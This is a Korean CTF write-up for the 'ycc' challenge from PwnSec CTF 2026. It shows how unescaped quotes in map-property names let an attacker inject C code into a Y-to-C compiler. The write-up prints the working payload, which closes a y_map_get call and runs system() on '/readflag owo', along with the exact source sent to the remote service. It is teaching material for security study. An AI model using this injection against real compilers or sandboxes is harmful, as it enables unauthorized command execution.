# ycc

> 스포일러: 이 문서는 문제의 분석 과정과 최종 풀이를 포함합니다.

## 개요

| 항목 | 내용 |
|---|---|
| 상태 | solved |
| 대회·플랫폼 | PwnSec CTF 2026 |
| 분야 | misc |
| 난이도 | Easy |
| Flag 형식 | `pwnsec{...}` |

원격 `ysh`는 입력한 Y 코드를 `ycc --no-exec --no-io`로 컴파일해 실행한다. 결정적인 관찰은 lexer가 `\x22`를 따옴표로 디코딩한 뒤 map property 이름을 C 문자열에 넣는 codegen 경로가 그 따옴표를 다시 이스케이프하지 않는다는 점이다. 따라서 생성되는 C 문장을 닫고 `system` 호출을 삽입할 수 있다.

## 환경 및 초기 분석

공식 입력은 [public.zip](../challenge/public.zip)이며, 압축 파일의 `Dockerfile`, `entrypoint.sh`, `ysh.y`, `ycc.c`, `runtime.c`를 확인했다. 서비스는 Alpine에서 `/app/ycc --no-exec --no-io --compile`을 실행하지만, 생성된 native binary에는 `runtime.c`가 함께 링크된다. `entrypoint.sh`는 flag를 포함한 `/readflag`를 만들고 setuid 권한을 준 뒤 환경 변수 `FLAG`를 제거한다. 따라서 환경 변수 조회가 아니라 `/readflag owo` 실행이 필요하다.

공용 Python 환경은 challenge root 기준 `../../requirements.txt`([competition requirements](../../../requirements.txt))와 competition root의 `.venv`를 사용했다. 추가 Python 패키지는 필요하지 않으며 TLS 연결에는 표준 라이브러리만 사용한다.

## 핵심 분석

문자열 expression은 C 출력 전에 따옴표가 이스케이프되어 단순한 `print("...\x22...")` 입력은 문자열로만 출력됐다. 반면 map property 접근은 생성된 C에서 다음 형태가 된다.

```c
YValue *_v = y_map_get(_m, "<property>");
```

Y lexer는 source의 `\x22`를 실제 `"` 문자로 바꾼다. property codegen이 이를 그대로 삽입하므로 아래 property 값은 첫 `y_map_get` 호출을 끝내고 임의 C statement를 추가한 뒤, 마지막에 유효한 `y_map_get(_m, "x")`를 복원한다.

```text
x"); system((char[]){47,114,101,97,100,102,108,97,103,32,111,119,111,0}); y_map_get(_m,"x
```

숫자 배열은 NUL 종료 문자열 `/readflag owo`이다. map에 실제 `x` key를 두었기 때문에 복원된 마지막 조회도 성공하고 생성된 프로그램은 정상적으로 flag reader를 실행한다. Root Cause는 decoded property 값을 C string literal에 삽입할 때 C escaping을 적용하지 않은 것이다.

## 풀이 및 재현

[solve.py](../solve.py)는 [instance.json](../instance.json)의 TLS endpoint에 연결하고 prompt를 받은 뒤 다음 Y source를 `eval`로 전송한다. 전체 구현은 solver에 있으며 실행 위치에 의존하지 않는다.

```text
let m = {x: 1}; print(m."x\x22); system((char[]){47,114,101,97,100,102,108,97,103,32,111,119,111,0}); y_map_get(_m,\x22x");
```

Competition의 `.venv`를 활성화하고 challenge root에서 실행한다.

```bash
python -m pip install -r ../../requirements.txt
python -m pip check
python solve.py
```

## 결과

`python solve.py`는 원격 응답에서 flag 형식만 추출해 stdout에 출력했고 종료 코드는 `0`이었다.

```text
pwnsec{a8c305c05309d5eb}
```

검증된 flag는 `pwnsec{a8c305c05309d5eb}`이다.

## 정리 및 회고

언어 sandbox에서 builtin을 제거해도 code generator가 untrusted token 값을 host 언어 source에 삽입하면 경계가 무너진다. lexer 단계의 escape decoding과 codegen 단계의 C escaping은 별개의 처리이며, 모든 identifier와 property 문자열에 동일한 C literal encoder를 적용해야 한다.

## 참고 자료

외부 자료는 사용하지 않았다. 공식 archive의 `Dockerfile`, `entrypoint.sh`, `ysh.y`, `ycc.c`, `runtime.c`만 분석과 재현에 사용했다.
